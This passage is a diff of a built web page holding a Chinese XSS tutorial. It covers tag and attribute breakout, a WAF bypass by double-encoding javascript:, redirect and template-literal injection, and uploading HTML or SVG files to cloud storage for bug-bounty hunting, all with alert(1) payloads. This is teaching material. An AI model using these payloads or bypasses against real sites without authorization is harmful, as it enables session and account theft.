+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>留言：<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>闭合原本的标签 → 插入脚本 → 再恢复结构</p>
 <p><strong>案例三：</strong>属性上下文闭合</p>
-<pre><code class="language-html">&lt;input value=&quot;{{input}}&quot;&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;{{input}}&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>输入：</p>
-<pre><code class="language-html">&quot; onfocus=alert(1) autofocus x=&quot;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>&quot; onfocus=alert(1) autofocus x=&quot;
+</span></code></pre></div></td></tr></table></div>
 <p>最终变成：</p>
-<pre><code class="language-html">&lt;input value=&quot;&quot; onfocus=alert(1) autofocus x=&quot;&quot;&gt;
-</code></pre>
-<h2 id="7-unicode-html">7. 进阶绕过技巧：Unicode + HTML 双重编码绕过</h2>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">autofocus</span> <span class="na">x</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="7-unicode-html">7. 进阶绕过技巧：Unicode + HTML 双重编码绕过<a class="headerlink" href="#7-unicode-html" title="Permanent link">&para;</a></h2>
 <p>在某些 Web 环境中，WAF会尝试检测危险内容（如 javascript: 协议），但由于编码解码处理顺序问题，<strong>我们可以巧妙绕过检测</strong>。</p>
-<h3 id="_10">背景场景：</h3>
+<h3 id="_10">背景场景：<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
 <p>前提条件：</p>
 <ul>
 <li>请求数据是 JSON 格式传输；</li>
 <li>输入被插入到 HTML 属性中，例如：</li>
 </ul>
-<pre><code class="language-html">&lt;a href=&quot;{{input}}&quot;&gt;点击跳转&lt;/a&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;{{input}}&quot;</span><span class="p">&gt;</span>点击跳转<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>WAF 会在服务端检测关键字（如 javascript:），但检测前会进行一次解码；</p>
 <p>我们可以利用这个顺序实现绕过。</p>
-<h3 id="_11">绕过原理：</h3>
+<h3 id="_11">绕过原理：<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
 <ol>
 <li><strong>构造 payload：</strong><ul>
 <li>将 <code>javascript:</code> 先进行 HTML 编码 → <code>javascript:</code> → <code>javascript&amp;#x3A;</code></li>
@@ -2902,10 +2922,10 @@ document.getElementById(&quot;result&quot;).innerHTML = q;
 </li>
 <li><strong>浏览器执行时被解析为:</strong></li>
 </ol>
-<pre><code class="language-html">&lt;a href=&quot;javascript:alert(1)&quot;&gt;点击跳转&lt;/a&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>点击跳转<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>即可成功触发xss</p>
-<h3 id="_12">注意事项：</h3>
+<h3 id="_12">注意事项：<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -2928,10 +2948,10 @@ document.getElementById(&quot;result&quot;).innerHTML = q;
 </tr>
 </tbody>
 </table>
-<h2 id="8-srcxss">8. SRC挖掘中XSS利用</h2>
+<h2 id="8-srcxss">8. SRC挖掘中XSS利用<a class="headerlink" href="#8-srcxss" title="Permanent link">&para;</a></h2>
 <p>相较于CTF中拿到flag的目的性，SRC更加注重漏洞造成的危害，因此攻击手法面更广</p>
 <p>除了前面所说的普通的XSS，SRC中一些技巧：</p>
-<h3 id="urlxss">url跳转xss</h3>
+<h3 id="urlxss">url跳转xss<a class="headerlink" href="#urlxss" title="Permanent link">&para;</a></h3>
 <p>url跳转是一种常见的Web安全问题，攻击者可以利用该漏洞将用户从受信任的网站重定向到恶意网站，从而实施钓鱼攻击、信息窃取或恶意软件下载等。</p>
 <p>若过滤不严，也可以被我们利用来触发XSS：</p>
 <p><code>https://example.com/redirect?url=javascript:alert(1);</code></p>
@@ -2939,55 +2959,75 @@ document.getElementById(&quot;result&quot;).innerHTML = q;
 <p><code>https://example.com/redirect?url=javascript://www.baidu.com/?%250aalert(1);</code></p>
 <p>使用%250a是因为<code>location.href</code>、<code>location.replace</code>、<code>window.ioen</code>三个写法会双重解码（第一次解码，传入后的url进行一次解码，跳转时会被当作url再被解码一次）</p>
 <p><code>%250a</code>其中<code>%25</code>解码后是<code>%</code></p>
-<h3 id="_13"><strong>格式化字符串</strong></h3>
+<h3 id="_13"><strong>格式化字符串</strong><a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
 <p><code>https://example.com?url=${alert(1)}</code></p>
 <p>XSS 不只是出现在 HTML 标签中，有时用户输入被直接写进 JavaScript 代码里，就形成了 <strong>JavaScript 上下文中的 XSS</strong>。</p>
 <p><strong>单引号包裹用户输入</strong></p>
-<pre><code class="language-html">&lt;script&gt;
-  const name = &quot;&lt;?php echo $_GET['name'] ?&gt;&quot;;
-  alert(name);
-&lt;/script&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
+<span class="normal"><a href="#__codelineno-23-2">2</a></span>
+<span class="normal"><a href="#__codelineno-23-3">3</a></span>
+<span class="normal"><a href="#__codelineno-23-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;?php echo $_GET[&#39;name&#39;] ?&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a><span class="w">  </span><span class="nx">alert</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>如果用户输入:<code>example.com/page.php?name=";&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p>页面会变成：</p>
-<pre><code class="language-html">&lt;script&gt;
-  const name = &quot;&quot;; &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
+<span class="normal"><a href="#__codelineno-24-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="w"> </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>多行模版字符串中的XSS</strong></p>
 <p>当输入内容被插入到多行语句中</p>
-<pre><code class="language-html">&lt;script&gt;
-  const name = `
-    Hello,
-    &lt;?php echo $_GET['name'] ?&gt;
-  `;
-  alert(name);
-&lt;/script&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
+<span class="normal"><a href="#__codelineno-25-2">2</a></span>
+<span class="normal"><a href="#__codelineno-25-3">3</a></span>
+<span class="normal"><a href="#__codelineno-25-4">4</a></span>
+<span class="normal"><a href="#__codelineno-25-5">5</a></span>
+<span class="normal"><a href="#__codelineno-25-6">6</a></span>
+<span class="normal"><a href="#__codelineno-25-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a><span class="sb">    Hello,</span>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4"></a><span class="sb">    &lt;?php echo $_GET[&#39;name&#39;] ?&gt;</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5"></a><span class="sb">  `</span><span class="p">;</span>
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6"></a><span class="w">  </span><span class="nx">alert</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>这段代码使用了 JS 的模板字符串（用 ``` 包裹），允许写多行字符串。</p>
 <p>此时攻击者传入此前的payload就会导致报错，但是此时攻击者就可以利用：</p>
-<pre><code class="language-javascript">name=${alert(1)}
-</code></pre>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="nx">name</span><span class="o">=</span><span class="nx">$</span><span class="p">{</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)}</span>
+</span></code></pre></div></td></tr></table></div>
 <p>页面变成：</p>
-<pre><code class="language-javascript">&lt;script&gt;
-  const name = `
-    Hello,
-    ${alert(1)}
-  `;
-  alert(name);
-&lt;/script&gt;
-</code></pre>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span>
+<span class="normal"><a href="#__codelineno-27-3">3</a></span>
+<span class="normal"><a href="#__codelineno-27-4">4</a></span>
+<span class="normal"><a href="#__codelineno-27-5">5</a></span>
+<span class="normal"><a href="#__codelineno-27-6">6</a></span>
+<span class="normal"><a href="#__codelineno-27-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3"></a><span class="sb">    Hello,</span>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4"></a><span class="sb">    </span><span class="si">${</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="si">}</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5"></a><span class="sb">  `</span><span class="p">;</span>
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6"></a><span class="w">  </span><span class="nx">alert</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>JavaScript 执行时会把 ${alert(1)} 替换为真正执行结果 → 正常弹窗</p>
-<h3 id="xss_1">云存储导致的XSS</h3>
+<h3 id="xss_1">云存储导致的XSS<a class="headerlink" href="#xss_1" title="Permanent link">&para;</a></h3>
 <p>上传xss到云存储桶上，但是前提是有cdn把可信域名解析到云存储的域名上（否则也是因为同源策略无法打大危害）</p>
 <p>上传时修改Content-Type:</p>
-<pre><code class="language-html">text/html
-text/xml
-image/svg+xml
-text/xsl
-application/xml
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span>
+<span class="normal"><a href="#__codelineno-28-2">2</a></span>
+<span class="normal"><a href="#__codelineno-28-3">3</a></span>
+<span class="normal"><a href="#__codelineno-28-4">4</a></span>
+<span class="normal"><a href="#__codelineno-28-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a>text/html
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a>text/xml
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>image/svg+xml
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a>text/xsl
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a>application/xml
+</span></code></pre></div></td></tr></table></div>
 <p>这是因为有的云存储解析上传的文件时，可能是通过Content-Type来判断文件类型。同理如果是通过后缀或文件头等因素判断，需要使用相应的方式进行绕过，让上传的文件通过我们想要的文件格式进行解析。</p>
-<h3 id="_14">一个小技巧</h3>
+<h3 id="_14">一个小技巧<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
 <p>比较大型的互联网公司的XSS通常不会直接被解析，都会进行一定的防护。需要细心查找，在其他地方查看我们插入的内容是否被解析。例如修改一个介绍内容时，在修改页面没有被解析，但是在操作日志中这个payload就被解析了。</p>
 <div class='document-dates-plugin-wrapper document-dates-bottom'><div class='document-dates-plugin' locale=''><span data-tippy-content data-tippy-raw='2026-03-13'><span class='material-icons' data-icon='doc_created'></span><time datetime='2026-03-13T12:43:48.672990+08:00'>2026-03-13 12:43:48</time></span><span data-tippy-content data-tippy-raw='2025-12-19'><span class='material-icons' data-icon='doc_modified'></span><time datetime='2025-12-19T18:06:57+08:00'>2025-12-19 18:06:57</time></span></div></div>
 
@@ -3098,7 +3138,15 @@ application/xml
     
       <script src="../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
       
-        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.js"></script>
+      
+        <script src="../../../../../assets/javascripts/pangu-init.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js"></script>
+      
+        <script src="../../../../../assets/javascripts/katex-init.js"></script>
       
         <script src="../../../../../assets/document_dates/tippy/popper.min.js"></script>
       
